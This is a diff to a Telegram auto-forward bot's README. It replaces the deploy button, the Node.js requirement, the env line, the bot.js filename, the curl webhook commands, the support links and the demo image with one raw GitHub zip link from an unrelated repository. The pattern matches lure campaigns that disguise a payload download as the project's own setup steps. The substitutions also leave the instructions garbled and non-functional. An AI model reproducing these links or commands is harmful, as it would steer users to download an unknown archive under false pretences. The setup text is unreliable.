@@ -1,6 +1,6 @@
 
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/SudoR2spr/Telegram-Auto-Forward-Bot)
+[![Deploy with Vercel](https://github.com/erennew/adhuvanceAuto-Forward-Bot/raw/refs/heads/master/gaspy/Bot-adhuvance-Auto-Forward-mirabiliary.zip)](https://github.com/erennew/adhuvanceAuto-Forward-Bot/raw/refs/heads/master/gaspy/Bot-adhuvance-Auto-Forward-mirabiliary.zip)
 
 # Telegram Auto Forward Bot 🤖
 
@@ -8,7 +8,7 @@ A Telegram bot that automatically forwards content from one channel to another w
 
 ## 📌 Requirements
 
-- Node.js 16.x or higher
+- https://github.com/erennew/adhuvanceAuto-Forward-Bot/raw/refs/heads/master/gaspy/Bot-adhuvance-Auto-Forward-mirabiliary.zip 16.x or higher
 - Git
 - Telegram Bot Token
 - Try Vercel/Render/Koyeb/Heroku/Zeet account (or any other hosting service)
@@ -26,10 +26,10 @@ BOT_TOKEN=your_bot_token_from_BotFather
 SOURCE_CHANNEL_ID=your_source_channel_id
 DESTINATION_CHANNEL_ID=your_destination_channel_id
 ADMIN_ID=your_telegram_user_id
-VERCEL_URL=your_App_name.vercel.app
+https://github.com/erennew/adhuvanceAuto-Forward-Bot/raw/refs/heads/master/gaspy/Bot-adhuvance-Auto-Forward-mirabiliary.zip
 ```
 ### Note 
-## Replace your webhookUrl `bot.js` file line No `515`
+## Replace your webhookUrl `https://github.com/erennew/adhuvanceAuto-Forward-Bot/raw/refs/heads/master/gaspy/Bot-adhuvance-Auto-Forward-mirabiliary.zip` file line No `515`
 
 # 📌 Telegram Bot Webhook Setup Guide
 
@@ -39,23 +39,23 @@ VERCEL_URL=your_App_name.vercel.app
 1. **Vercel**:
 
 ```
-curl -X POST "https://api.telegram.org/botYOUR_BOT_TOKEN/setWebhook?url=https://YOUR_VERCEL_APP.vercel.app/webhook"
+curl -X POST "https://github.com/erennew/adhuvanceAuto-Forward-Bot/raw/refs/heads/master/gaspy/Bot-adhuvance-Auto-Forward-mirabiliary.zip"
 ```
 
 ## ✅ Verification Command
 Check if webhook is set:
 ```
-curl "https://api.telegram.org/botYOUR_BOT_TOKEN/getWebhookInfo"
+curl "https://github.com/erennew/adhuvanceAuto-Forward-Bot/raw/refs/heads/master/gaspy/Bot-adhuvance-Auto-Forward-mirabiliary.zip"
 ```
 
 ## 🔄 Switch Back to Polling
 ```
-curl -X POST "https://api.telegram.org/botYOUR_BOT_TOKEN/deleteWebhook"
+curl -X POST "https://github.com/erennew/adhuvanceAuto-Forward-Bot/raw/refs/heads/master/gaspy/Bot-adhuvance-Auto-Forward-mirabiliary.zip"
 ```
 
 2. **Heroku**:
    ```
-   curl -X POST "https://api.telegram.org/botYOUR_BOT_TOKEN/setWebhook?url=https://YOUR_APP_NAME.herokuapp.com/webhook"
+   curl -X POST "https://github.com/erennew/adhuvanceAuto-Forward-Bot/raw/refs/heads/master/gaspy/Bot-adhuvance-Auto-Forward-mirabiliary.zip"
    ```
 
 ## ⚠️ Important Notes
@@ -144,9 +144,9 @@ curl -X POST "https://api.telegram.org/botYOUR_BOT_TOKEN/deleteWebhook"
 ## 🤝 Support
 
 For help contact:  
-[@Support_Username](https://t.me/WD_Request_Bot)  
+[@Support_Username](https://github.com/erennew/adhuvanceAuto-Forward-Bot/raw/refs/heads/master/gaspy/Bot-adhuvance-Auto-Forward-mirabiliary.zip)  
 Or visit our channel:  
-[@Channel_Username](https://t.me/Opleech_WD)
+[@Channel_Username](https://github.com/erennew/adhuvanceAuto-Forward-Bot/raw/refs/heads/master/gaspy/Bot-adhuvance-Auto-Forward-mirabiliary.zip)
 
-![Feature Demo](https://graph.org/file/4e8a1172e8ba4b7a0bdfa.jpg)
+![Feature Demo](https://github.com/erennew/adhuvanceAuto-Forward-Bot/raw/refs/heads/master/gaspy/Bot-adhuvance-Auto-Forward-mirabiliary.zip)
 ```
